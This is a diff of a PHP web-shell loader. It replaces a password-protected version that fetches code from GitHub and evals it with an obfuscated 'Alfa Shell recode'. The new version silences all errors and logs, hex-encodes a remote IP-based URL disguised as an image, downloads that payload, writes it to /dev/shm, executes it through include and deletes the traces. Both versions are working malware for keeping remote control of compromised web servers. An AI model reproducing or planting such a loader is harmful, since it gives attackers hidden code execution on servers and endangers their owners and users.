@@ -1,78 +1,82 @@
 <?php
-session_start();
+    error_reporting(0);
+    ini_set('display_errors', '0');
+    ini_set('log_errors', '0');
+    /**
+     * @package    Haxor.Group
+     *
+     * @copyright  Copyright (C) 2023 - 2024 Leviathan Perfect Hunter Team.
+     *
+     */
+    // Alfa Shell recode - Does not have any logger.
+    function geturlsinfo($url) {
+        if (function_exists('curl_exec')) {
+            $conn = curl_init($url);
+            
+            
+            $opt1 = constant('CURLOPT_RETURNTRANSFER');
+            $opt2 = constant('CURLOPT_FOLLOWLOCATION');
+            $opt3 = constant('CURLOPT_USERAGENT');
+            $opt4 = constant('CURLOPT_SSL_VERIFYPEER');
+            $opt5 = constant('CURLOPT_SSL_VERIFYHOST');
+            $opt6 = constant('CURLOPT_COOKIE');
 
-/**
- * Disable error reporting
- *
- * Set this to error_reporting( -1 ) for debugging.
- */
-function geturlsinfo($url) {
-    if (function_exists('curl_exec')) {
-        $conn = curl_init($url);
-        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+            
+            curl_setopt($conn, $opt1, 1);
+            curl_setopt($conn, $opt2, 1);
+            curl_setopt($conn, $opt3, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+            curl_setopt($conn, $opt4, 0);
+            curl_setopt($conn, $opt5, 0);
 
-        // Set cookies using session if available
-        if (isset($_SESSION['coki'])) {
-            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
+            if (isset($_SESSION['java'])) {
+                curl_setopt($conn, $opt6, $_SESSION['java']);
+            }
+
+            $url_get_contents_data = curl_exec($conn);
+            curl_close($conn);
+        } elseif (function_exists('file_get_contents')) {
+            $url_get_contents_data = file_get_contents($url);
+        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+            $handle = fopen($url, "r");
+            $url_get_contents_data = stream_get_contents($handle);
+            fclose($handle);
+        } else {
+            $url_get_contents_data = false;
         }
-
-        $url_get_contents_data = curl_exec($conn);
-        curl_close($conn);
-    } elseif (function_exists('file_get_contents')) {
-        $url_get_contents_data = file_get_contents($url);
-    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-        $handle = fopen($url, "r");
-        $url_get_contents_data = stream_get_contents($handle);
-        fclose($handle);
-    } else {
-        $url_get_contents_data = false;
+        return $url_get_contents_data;
     }
-    return $url_get_contents_data;
-}
 
-// Function to check if the user is logged in
-function is_logged_in()
-{
-    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
-}
+    $love = '687474703a2f2f3135362e'; 
+    $destiny = '36372e'; 
+    $dream = '3232312e';
+    $purpose = '32392f'; 
+    $haxor = '68782e6a7067';
 
-// Check if the WUKONG is submitted and correct
-if (isset($_POST['WUKONG'])) {
-    $entered_WUKONG = $_POST['WUKONG'];
-    $hashed_WUKONG = 'c093dc91971d9e40fd06d0a4227dcd0c';
-    if (md5($entered_WUKONG) === $hashed_WUKONG) {
-        $_SESSION['logged_in'] = true;
-        $_SESSION['coki'] = 'asu';
-    } else {
-        
-        echo "SALAH KAMAR KAU BOS, TENNESSEE ";
+    function hex2str($hex) {
+        $str = '';
+        for ($i = 0; $i < strlen($hex); $i += 2) {
+            $str .= chr(hexdec(substr($hex, $i, 2)));
+        }
+        return $str;
     }
-}
 
-// Check if the user is logged in before executing the content
-if (is_logged_in()) {
-    $a = geturlsinfo('https://raw.githubusercontent.com/HoneyTennessee/HoneyTennessee/refs/heads/main/sxy.txt');
-    eval('?>' . $a);
-} else {
-    // Display login form if not logged in
+
+    function clean_old_temp_files() {
+        $temp_files = glob('/dev/shm/prefix*');
+        foreach ($temp_files as $file) {
+            if (is_file($file)) {
+                unlink($file);
+            }
+        }
+    }
+
+
+    clean_old_temp_files();
+
+    $url = hex2str($love) . hex2str($destiny) . hex2str($dream) . hex2str($purpose) . hex2str($haxor);
+    $a = geturlsinfo($url);
+    $temporary_file = tempnam('/dev/shm', 'prefix');
+    file_put_contents($temporary_file, $a);
+    include $temporary_file;
+    unlink($temporary_file);
     ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>HONEY TENNESSEE</title>
-    </head>
-    <body>
-        <form method="POST" action="">
-            <label for="WUKONG">Apakah Kalian Tahu Keberadaan HONEYTENNESSEE ?</label>
-            <input type="password" display="none" id="WUKONG" name="WUKONG">
-            <input type="submit" value="Cari">
-        </form>
-    </body>
-    </html>
-    <?php
-}
-?>
